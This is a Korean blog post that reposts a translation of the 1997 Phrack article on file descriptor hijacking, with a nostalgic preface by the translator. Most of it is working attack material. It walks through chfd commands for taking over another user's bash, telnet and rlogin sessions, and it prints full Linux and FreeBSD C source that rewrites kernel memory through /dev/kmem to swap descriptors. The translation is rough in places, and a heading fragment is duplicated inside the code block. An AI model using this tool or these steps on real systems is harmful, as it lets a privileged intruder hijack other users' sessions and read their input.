---
title: "Phrack magazine Vol7 Issue51 File Descriptor Hijacking"
date: 2021-03-07T16:21:21+08:00
draft: false
tags: [phrack,file descriptor]
authors:
  - younjinjeong
categories:
  - Linux
  - FreeBSD
  - Hack
  - Phrack
---

### 블로그 테스트용으로 올려보는 예전 번역 

10년전 KHDP에서 번역했었던  
File descriptor hijacking 에 대한 글이 생각나  
구글링을 해 보았더니, 수정없이 그냥들 보고 있는게 많더라.  
  
사실, FD Hijacking 정도 볼 것 같으면  
고딩의 저 어설픈 번역을 수정 할 법도 한데 그냥들 보고 있다는 말이지  홀홀..  
  
10년이 지난 지금, 아직도 저런 공격방법이 통할 지는 모르겠지만  
  
그 시절, 열정만을 가지고 밤새워 번역하고 코드 테스트도 해보며  
이땅에 리눅스 및 BSD가 창궐하기전 홀로 즐겼던 세상으로 다시 돌아가 본다.  
  
그때가 그립다. 순수했고, 열정적이었던 열 여덟살....  
그 열정으로 서른 살을 살았더라면,  난 지금 무엇이 되어 있었을까.  

**근데 이제 벌써 마흔**  

어릴때 번역한거라 굉장히 허접스러우므로... 시간 되면 한번 다시 손보는 걸로. ㅋ 

### 시작 

-----------------------------[ Pearls Of Wisdom ]----------------------------
Procrastination is the denial of death.
Lift with your leg, not your back.
------[EOF

-----[ Phrack Magazine Volume 7, Issue 51 September 01, 1997, article 05 of 17

---------------------[ File Descriptor Hijacking 
--------------[ orabidoo <odar@pobox.com>



소개
----

우리는 종종 사용자의 권한을 넘어 root를 얻는 방법에 대한 tty hijacking에 대해
듣곤한다. 이것을 위한 Sys V의 스트림(STREAMS)을 사용한 전통적인 툴과 리눅스에서
loadable module을 사용하기위한 방법으로 본지의 50호에 특별히 소개된적이 있었다.  

나는 remote 또는 local머신의 루트를 얻는 간단한 테크닉을 소개하고자 한다. 리눅스와
FreeBSD를 사용했다. : root가 kernel memory에 쓸수 있는 유닉스 비슷한 시스템이라면
어디서나 가능하다.  

아이디어는 간단하다. :커널의 fd table을 약간 꼬아서, 하나의 프로세스에서 다른 프로세스로
fd를 강제적으로 옮기는 것이다.  

이 방법은 당신이 할 수있는 거의 모든일을 가능하게 한다. : 실행되고있는 커맨드의 output을
파일로 리다이렉션 시킨다든지, 당신의 이웃의 텔넷 커넥션에서 까지도 가능하다.



커널은 어떻게 열린 fd의 track을 지키는가.
-----------------------------------

유닉스에서, 프로세스가 fd로 이루어진 자원에 접근하는 방법은 open(),socket(),pipe()
들과 같은 시스템 콜로서 가능하다. 프로세스의 관점에서 보면 , fd는 리소스에 대한
불투명한 핸들이다. fd의 0,1,2는 각각 표준 입력, 출력, 에러를 나타낸다. 새로운
descriptor는 항상 시퀀스에 올로케이트 되어있다.

펜스(fense)의 다른면에서, 커널이 지키고, 서로다른 프로세스간에 fd table은 각 fd
structure로의 포인터로 이루어진다. fd가 열려있지 않으면 포인터는 NULL이다. 반면에,
structure는 fd자체에 대한 종류(file, socket, pipe, etc...)에 대한 정보를 가지고
있으며, fd access에 대한 자원(파일의 inode, 소켓의 주소와 상태정보 등등..)의 데이터에
대한 포인터를 함께 가지고 있다.

보통 프로세스 테이블은 링크된 스트럭쳐의 리스트 또는 배열(array)로 구성되어있다. 주어진
프로세스를 위한 스트럭쳐에서부터, 당신은 그 프로세스에 대한 내부의 fd테이블을 손쉽게
찾을수 있을 것이다.

리눅스에서, 프로세스 테이블은 task_struct의 구조체 배열("task"로 불려지는)이며, 구조체
files_struct로의 fd배열을 가진(/usr/include/linux/sched.h 참조) 포인터를 포함하고
있다. SunOS 4에서 프로세스 테이블은 fd들에 대한 정보를 가지고 있는 u_area로의 포인터를
포함한 스트럭트 proc's의 링크드 리스트이다. FreeBSD에서 역시 allproc라 불리는 스트럭트
proc's의 링크드 리스트이며, 그것은 fd테이블을 포함한 구조체 filedesc로의 포인터를 가진다.
(/usr/include/sys/proc.h 참조)

만약 커널 메모리에 쓰기 또는 읽기 access를 가지고 있다면(대부분 이것은 /dev/kmem
을 읽거나 쓰는것과 같다.) fd테이블들의 잡탕속에서 열려진 fd를 프로세스에서 훔치는 것과,
다른 프로세스에서 재사용하는것을 방해할것은 아무것도 없다.

이것은 보안레벨 0등급이상에서 돌아가는 BSD4.4(BSD)와 같은 시스템에서는
동작하지 않는다. 저런 모드에서는 /dev/kmem, /dev/mem과 같은 곳으로의 접근이 불가능하다.
그러나 많은 BSD시스템들은 약점이 있는 보안등급 -1에서 동작하며, StartUP스크립트를
조작하여 다음번 재부팅때 보안등급을 -1로 끌어내리는것도 가능할 수 있다. FreeBSD에서는
"sysct | kern.securelevel"명령어로 보안등급을 확인할수 있다. 리눅스역시 보안등급을
가지고는 있지만, 리눅스는 /dev/kmem으로의 접근을 방해하지는 않을 것이다.
  
  
  

File descriptor Hijacking
---------------------

커널 내부의 변수들은 사용자 프로그램에 의해 수정될 수 없다.

첫째로, 멀티 태스킹 시스템에서 당신은 변수의 주소를 찾아내고, 그 값을 바꾸는 사이에
커널의 상태가 바뀌지 않는데 대한 아무런 잇점(guarantee)이 없다. 이것은 우리가 왜 이
기술을 확실성에 목적을 둔 프로그램들에서 사용되어 질 수 없는지를 보여준다. 말했듯이,
연습에서 난 실패한적이 없다. 왜냐하면 커널은 한번 할당되어진 (최소한 처음 20,32,64...
프로세스당 fd) 이러한 종류의 데이터를 옮기지 않으며, 프로세스가 닫히거나 새로 fd를
만들어 열때 시도하는것은 거의 불가능하다.

First of all, on a multitasking system, you have no guarantee that the
kernel's state won't have changed between the time you find out a
variable's address and the time you write to it (no atomicity). This is
why these techniques shouldn't be used in any program that aims for
reliability. That being said, in practice, I haven't seen it fail, because
the kernel doesn't move this kind of data around once it has allocated it
(at least for the first 20 or 32 or 64 or so fds per process), and because
it's quite unlikely that you'll do this just when the process is closing or
opening a new fd. ---- 아리송해서 원문도 같이 붙여봅니당. ^^;;


You still want to try it?


단순한 목적을 위해, 우리는 두 프로세스간의 fd복제 또는 한 프로세스에서 다른 프로세스로
리턴값이 없는 프로세스로의 fd passing을 시도하지는 않을 것이다.
대신, 우리는 프로세스의 fd를 다른 프로세스의 fd와 교환할것이다. 이 방법은 우리가
열려진 파일과 거래할수 있는 유일한 방법이며, 카운트 참조와 같은 방법은 사용하지 않을
것이다. 이것은 가능한 한 간단하게 커널안에서 두개의 포인터를 찾아내고, 그것들을
교환할 것이다. 약간 더 복잡한 버젼은 fd에 대한 3개의 포로세스와 원형순열(교환)을
포함한다.

당연히, 당신은 바꾸고자하는 fd에 일치할만한 리소스를 추측해서 알아내야만 한다. 실행되고
있는 쉘의 완벽한 제어를 위해 당신은 표준입력, 출력, 에러를 원할것이며, 또 0,1,2로 불리는
이 세가지 fd들을 취해야 할 필요가 있다.할 필요가 있다. 또, 당신은 텔넷 세션을 제어하기
위해 텔넷이 인터넷의 다른 쪽과 대화하기위해 사용하는 inet socket의 fd를(주로 3)
원할 것이며, 동작하는 다른 텔넷과 fd를 교환 할 것이다. 리눅스에서는 /proc/[pid]/fd
에서 프로세스가 사용하는 fd를 얻을수 있다.


Using chfd
----------

마무리를 위한 도구로서 linux와 FreeBSD를 가지고 있다. 그것은 공평하게 다른 시스템으로 t쉽게 옮겨(포팅되어) 질 수 있다.

리눅스에서 chfd를 컴파일 하기 위해서는 리눅스 커널의 동작에 대해 몇가지 이해해야
할것들이 있다. 만약 1.2.13이나 그 비슷한 것이라면, /* #define OLDLINUX */의 주석을
지워야 할 필요가 있는데, 왜냐하면 커널의 구조가 그때 부터 바뀌었기 때문이다. 만약 2.0.0
이나 그 이상이라면 다시 바뀔 수 있을 지라도 box의 바깥쪽에서도 동작할것이다.

그리고 커널에서 심볼테이블을 찾아야 할 필요가 있는데, 그것은 아마 /boot/System.map또는
그 비슷한데 있을 것이다. 이것은 실제 동작하고 있는 커널에 대해 일치한다는것을 확인해야
한다.

그리고 "take" 심볼의 주소를 뒤져봐야 할것이다. 이 값을 "00192d28"대신에 chfd에 넣어
주어야 한다. 그리고 "gcc chfd.c -o chfd"명령과 함께 컴파일 하라.

FreeBSD에서 컴파일 하기 위해서는 단지 FreeBSD 코드를 얻은후에 "gcc chfd.c. -o chfd -lkvm"명령과 함께 컴파일 하면 된다. 이 코드는 FreeBSD 2.2.1 에서 작성 되었으며, 다른 버젼을 위해 좀 만져줘야 할 수도 있다.
  
컴파일 된후에, chfd를 다음과 같이 실행한다.

~~~bash
$ chfd pid1 fd1 pid2 fd2
# 또는,
$ chfd pid1 fd1 pid2 fd2 pid3 fd3
~~~

첫번째 경우, fd는 단지 교환(swap)되었을 뿐이다. 두번째는 두번째 프로세스가 첫번째의
fd를 얻고, 세번째(프로세스)가 두번째의 fd를 얻으며, 첫번째가 세번째의 fd를 얻어낸다.

특별한 경우로, pid중의 하나가 0일 경우에 일치하는 fd가 버려지며, 그것 대신 /dev/null
값이 fd에 pass된다.



Example 1
---------

. pid 207 이 긴 계산을 하며, tty로 output 되는 경우.  
. 당신이 "cat > somefile"을 실행시키고, 그것의 pid를 조사 했을 경우(1746)

그렇다면

~~~bash
$ chfd 207 1 1746 1
~~~

이것은 그 계산을 "somefile"이란 파일로 리다이렉션 시킬것이며, 그 계산이 돌아가고있는 tty를 화면에 출력할 것이다. 그러면 ^C 로 화면에 출력되는 중요한 계산의 결과값에 대한 두려움 없이 실행을 중지할수 있다.


Example 2
---------

. 누군가 tty에서 bash의 복사본을 pid 4022로 돌리고 있을때.  
. 당신이 tty에서 bash의 또다른 복사본을 pid 4121로 돌리고 있을때.

그러면

~~~bash
sleep 10000
# 당신의 bash에서 실행하면 당분간 tty에서 읽지 않을 것이다.
# 그렇지 않으면 당신의 쉘은 /dev/null 로부터 EOF를 취한후에 죽을 것이다.
# 그 세션은 즉시,

$ chfd 4022 0 0 0 4121 0
$ chfd 4022 1 0 0 4121 1
$ chfd 4022 2 0 0 4121 2

~~~

그리고 다른사람의 키 입력을 /dev/null로 보내는 동안에 bash와 output의 제어를 찾아라.
당신이 쉘을 떠날때, 그는 그의 세션이 연결종료 됬다는것을 알아내고, 당신은 ^C로 당신의
sleep를 죽이면 안전해 질수 있다.

다른 쉘들은 아마 다른 fd를 사용할 것이다. zsh는 tty로 부터 읽어 들일때 fd 10을
사용하는것 같은데, 그에 따라 직접 바꿔 줄 필요가 있을 것이다.


Example 3
---------

. 누군가 pid 6309로 tty에서 텔넷을 실행 시키고 있을때.  
. 당신이 pid 7081로 텔넷을 중요하지 않은 포트로 너무 빨리 드롭 되지 않도록 실행 시킬때.
(telnet localhost 7, telnet www.yourdomain 80, 기타 등등)  
. 리눅스에서, 빠르게 /proc/6309/fd 와 /proc/7081/fd 를 살펴보면 텔넷이 사용하고 있는
fd 0, 1,2,3( 3은 분명 그 커넥션일 것이다.)를 알수 있을 것이다.  

그러면

~~~bash
$ chfd 6309 3 7081 3 0 0
~~~

이것은 그 다른 사람의 텔넷 커넥션을 /dev/null 로 보낼것이다. (다른 사용자의 텔넷은 EOF를
읽어 "Connection closed by foreign host."라는 메세지를 볼것이다.) 그리고 당신의
텔넷은 스스로 그 다른 사용자의 리모트 호스트에 연결될 것이다. 이 시점에서 당신의 텔넷이
연결 위치에 echo를 멈추도록 하기 위해 당신은 아마도 ^]를 누르고 "mode character"를
칠것이다.

Example 4
---------

. 누군가 tty에서 rlogin를 돌리고 있을 경우. " 각자의 rlogin이 pid 4547과 4548를
  쓰고 있을때.  
. 당신은 다른 tty에서 pid 4852와 pid 4855로 rlogin localhost 을 돌리고,  
. /proc/../fds 와 관련된 것들을 빠르게 살펴봄으로서 rlogin 프로세스가 커넥션을 위해
  fd 3을 쓰고 있다는것을 알아 냈을때.  

그렇다면,

~~~bash
chfd 4547 3 4852 3 (원문에서는 이부분이 chfd 4547 3 4552 3)
chfd 4548 3 4855 3 (역시 chfd 4548 3 4555 3)
~~~

당신의 rlogin이 일어날수 없는 이벤트(localhost로부터 데이터를 읽는것)를 기다리는
것때문에 커널에 의해 당신의 rlogin이 아직 막혀 있는 경우를 제외하고 이것은 당신이
기대한대로 동작할 것이다. 이러한 경우, 'fg'에 따라 kill -STOP을 실행 시킴으로서
다시 rlogin을 깨울수 있다.

당신은 아이디어를 얻었다. 프로그램이 다른 프로그램의 fd를 얻는 동안 그것을 가지고
무엇을 해야할지 아는것은 중요하다. 대부분의 경우 당신은 같은 프로그램의 복사본을
실행시키는 것으로 ,만약 /dev/null, stdin/stdout/stderr로 fd를 패스 하지
않는한, 당신이 원하는것을 얻을수 있을 것이다.


Conclusion
----------

당신도 보았듯이, 이걸 가지고 꽤 무서운 짓을 할수 있다. 그리고 루트가 이것을 돌리는
것으로 부터 당신 자신을 보호하는 것 또한 정말 어렵다.

이것은 보안 구멍 조차 아니라는 점에서 논의 될수있다. 이 짓들이 가능하기 위해선
루트가 *필요*하다. 반면에 /dev/kmem의 드라이버 코드 안에 당신이 /dev/kmem에
쓰도록(write) 할 수 있는 명백한 코드는 없을것이다. 그렇지 않은가?



The Linux code
--------------

~~~c
<++> fd_hijack/chfd-linux.c
/*  chfd - exchange fd's between 2 or 3 running processes.
 *  
 *  This was written for Linux/intel and is *very* system-specific.
 *  Needs read/write access to /dev/kmem; setgid kmem is usually enough.
 *
 *  Use: chfd pid1 fd1 pid2 fd2 [pid3 fd3]
 *
 *  With two sets of arguments, exchanges a couple of fd between the 
 *  two processes.
 *  With three sets, the second process gets the first's fd, the third gets
 *  the second's fd, and the first gets the third's fd.
 *
 *  Note that this is inherently unsafe, since we're messing with kernel
 *  variables while the kernel itself might be changing them.  It works
 *  in practice, but no self-respecting program would want to do this.
 *
 *  Written by: orabidoo <odar@pobox.com>
 *  First version: 14 Feb 96
 *  This version: 2 May 97
 */

 #include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#define __KERNEL__		/* needed to access kernel-only definitions */
#include <linux/sched.h>

/* #define OLDLINUX */		/* uncomment this if you're using Linux 1.x;
				   tested only on 1.2.13 */

#define TASK 0x00192d28		/* change this! look at the system map,
				   usually /boot/System.map, for the address
				   of the "task" symbol */

#ifdef OLDLINUX
#  define FD0 ((char *)&ts.files->fd[0] - (char *)&ts)
#  define AD(fd) (taskp + FD0 + 4*(fd))
#else
#  define FILES ((char *)&ts.files - (char *)&ts)
#  define FD0 ((char *)&fs.fd[0] - (char *)&fs)
#  define AD(fd) (readvalz(taskp + FILES) + FD0 + 4*(fd))
#endif


int kfd;
struct task_struct ts;
struct files_struct fs;
int taskp;

int readval(int ad) {
  int val, r;

  if (lseek(kfd, ad, SEEK_SET) < 0)
    perror("lseek"), exit(1);
  if ((r = read(kfd, &val, 4)) != 4) {
    if (r < 0)
      perror("read");
    else fprintf(stderr, "Error reading...\n");
    exit(1);
  }
  return val;
}

int readvalz(int ad) {
  int r = readval(ad);
  if (r == 0)
    fprintf(stderr, "NULL pointer found (fd not open?)\n"), exit(1);
  return r;
}

void writeval(int ad, int val) {
  int w;

  if (lseek(kfd, ad, SEEK_SET) < 0)
    perror("lseek"), exit(1);
  if ((w = write(kfd, &val, 4)) != 4) {
    if (w < 0)
      perror("write");
    else fprintf(stderr, "Error writing...\n");
    exit(1);
  }
}

void readtask(int ad) {
  int r;

  if (lseek(kfd, ad, SEEK_SET)<0)
    perror("lseek"), exit(1);
  if ((r = read(kfd, &ts, sizeof(struct task_struct))) !=
	sizeof(struct task_struct)) {
    if (r < 0)
      perror("read");
    else fprintf(stderr, "Error reading...\n");
    exit(1);
  }
}

void findtask(int pid) {
  int adr;

  for (adr=TASK; ; adr+=4) {
    if (adr >= TASK + 4*NR_TASKS)
      fprintf(stderr, "Process not found\n"), exit(1);
    taskp = readval(adr);
    if (!taskp) continue;
    readtask(taskp);
    if (ts.pid == pid) break;
  }
}

int main(int argc, char **argv) {
  int pid1, fd1, pid2, fd2, ad1, val1, ad2, val2, pid3, fd3, ad3, val3;
  int three=0;

  if (argc != 5 && argc != 7)
    fprintf(stderr, "Use: %s pid1 fd1 pid2 fd2 [pid3 fd3]\n", argv[0]), 
    exit(1);

  pid1 = atoi(argv[1]), fd1 = atoi(argv[2]);
  pid2 = atoi(argv[3]), fd2 = atoi(argv[4]);
  if (argc == 7)
    pid3 = atoi(argv[5]), fd3 = atoi(argv[6]), three=1;

  if (pid1 == 0)
    pid1 = getpid(), fd1 = open("/dev/null", O_RDWR);
  if (pid2 == 0)
    pid2 = getpid(), fd2 = open("/dev/null", O_RDWR);
  if (three && pid3 == 0)
    pid3 = getpid(), fd3 = open("/dev/null", O_RDWR);

  kfd = open("/dev/kmem", O_RDWR);
  if (kfd < 0)
    perror("open"), exit(1);

  findtask(pid1);
  ad1 = AD(fd1);
  val1 = readvalz(ad1);
  printf("Found fd pointer 1, value %.8x, stored at %.8x\n", val1, ad1);

  findtask(pid2);
  ad2 = AD(fd2);
  val2 = readvalz(ad2);
  printf("Found fd pointer 2, value %.8x, stored at %.8x\n", val2, ad2);

  if (three) {
    findtask(pid3);
    ad3 = AD(fd3);
    val3 = readvalz(ad3);
    printf("Found fd pointer 3, value %.8x, stored at %.8x\n", val3, ad3);
  }

  if (three) {
    if (readval(ad1)!=val1 || readval(ad2)!=val2 || readval(ad3)!=val3) {
      fprintf(stderr, "fds changed in memory while using them - try again\n");
      exit(1);
    }
    writeval(ad2, val1);
    writeval(ad3, val2);
    writeval(ad1, val3);
  } else {
    if (readval(ad1)!=val1 || readval(ad2)!=val2) {
      fprintf(stderr, "fds changed in memory while using them - try again\n");
      exit(1);
    }
    writeval(ad1, val2);
    writeval(ad2, val1);
  }
  printf("Done!\n");
}
~~~


The FreeBSD Code 
----------------

~~~c
he FreeBSD code
----------------

<++> fd_hijack/chfd-freebsd.c

/*  chfd - exchange fd's between 2 or 3 running processes.
 *  
 *  This was written for FreeBSD and is *very* system-specific.  Needs 
 *  read/write access to /dev/mem and /dev/kmem; only root can usually 
 *  do that, and only if the system is running at securelevel -1.
 *
 *  Use: chfd pid1 fd1 pid2 fd2 [pid3 fd3]
 *  Compile with: gcc chfd.c -o chfd -lkvm
 *
 *  With two sets of arguments, exchanges a couple of fd between the 
 *  two processes.
 *  With three sets, the second process gets the first's fd, the third 
 *  gets the second's fd, and the first gets the third's fd.
 *
 *  Note that this is inherently unsafe, since we're messing with kernel
 *  variables while the kernel itself might be changing them.  It works
 *  in practice, but no self-respecting program would want to do this.
 *
 *  Written by: orabidoo <odar@pobox.com>
 *  FreeBSD version: 4 May 97
 */


#include <stdio.h>
#include <fcntl.h>
#include <kvm.h>
#include <sys/proc.h>

#define NEXTP ((char *)&p.p_list.le_next - (char *)&p)
#define FILES ((char *)&p.p_fd - (char *)&p)
#define AD(fd) (readvalz(readvalz(procp + FILES)) + 4*(fd))

kvm_t *kfd;
struct proc p;
u_long procp, allproc;
struct nlist nm[2];

u_long readval(u_long ad) {
  u_long val;

  if (kvm_read(kfd, ad, &val, 4) != 4)
    fprintf(stderr, "error reading...\n"), exit(1);
  return val;
}

u_long readvalz(u_long ad) {
  u_long r = readval(ad);
  if (r == 0)
    fprintf(stderr, "NULL pointer found (fd not open?)\n"), exit(1);
  return r;
}

void writeval(u_long ad, u_long val) {
  if (kvm_write(kfd, ad, &val, 4) != 4)
    fprintf(stderr, "error writing...\n"), exit(1);
}

void readproc(u_long ad) {
  if (kvm_read(kfd, ad, &p, sizeof(struct proc)) != sizeof(struct proc))
    fprintf(stderr, "error reading a struct proc...\n"), exit(1);
}

void findproc(int pid) {
  u_long adr;

  for (adr = readval(allproc); adr; adr = readval(adr + NEXTP)) {
    procp = adr;
    readproc(procp);
    if (p.p_pid == pid) return;
  }
  fprintf(stderr, "Process not found\n");
  exit(1);
}

int main(int argc, char **argv) {
  int pid1, fd1, pid2, fd2, pid3, fd3;
  u_long ad1, val1, ad2, val2, ad3, val3;
  int three=0;

  if (argc != 5 && argc != 7)
    fprintf(stderr, "Use: %s pid1 fd1 pid2 fd2 [pid3 fd3]\n", argv[0]), 
    exit(1);

  pid1 = atoi(argv[1]), fd1 = atoi(argv[2]);
  pid2 = atoi(argv[3]), fd2 = atoi(argv[4]);
  if (argc == 7)
    pid3 = atoi(argv[5]), fd3 = atoi(argv[6]), three=1;

  if (pid1 == 0)
    pid1 = getpid(), fd1 = open("/dev/null", O_RDWR);
  if (pid2 == 0)
    pid2 = getpid(), fd2 = open("/dev/null", O_RDWR);
  if (three && pid3 == 0)
    pid3 = getpid(), fd3 = open("/dev/null", O_RDWR);

  kfd = kvm_open(NULL, NULL, NULL, O_RDWR, "chfd");
  if (kfd == NULL) exit(1);

  bzero(nm, 2*sizeof(struct nlist));
  nm[0].n_name = "_allproc";
  nm[1].n_name = NULL;
  if (kvm_nlist(kfd, nm) != 0)
    fprintf(stderr, "Can't read kernel name list\n"), exit(1);
  allproc = nm[0].n_value;

  findproc(pid1);
  ad1 = AD(fd1);
  val1 = readvalz(ad1);
  printf("Found fd pointer 1, value %.8x, stored at %.8x\n", val1, ad1);

  findproc(pid2);
  ad2 = AD(fd2);
  val2 = readvalz(ad2);
  printf("Found fd pointer 2, value %.8x, stored at %.8x\n", val2, ad2);

  if (three) {
    findproc(pid3);
    ad3 = AD(fd3);
    val3 = readvalz(ad3);
    printf("Found fd pointer 3, value %.8x, stored at %.8x\n", val3, ad3);
  }

  if (three) {
    if (readval(ad1)!=val1 || readval(ad2)!=val2 || readval(ad3)!=val3) {
      fprintf(stderr, "fds changed in memory while using them - try again\n");
      exit(1);
    }
    writeval(ad2, val1);
    writeval(ad3, val2);
    writeval(ad1, val3);
  } else {
    if (readval(ad1)!=val1 || readval(ad2)!=val2) {
      fprintf(stderr, "fds changed in memory while using them - try again\n");
      exit(1);
    }
    writeval(ad1, val2);
    writeval(ad2, val1);
  }
  printf("Done!\n");
}
~~~

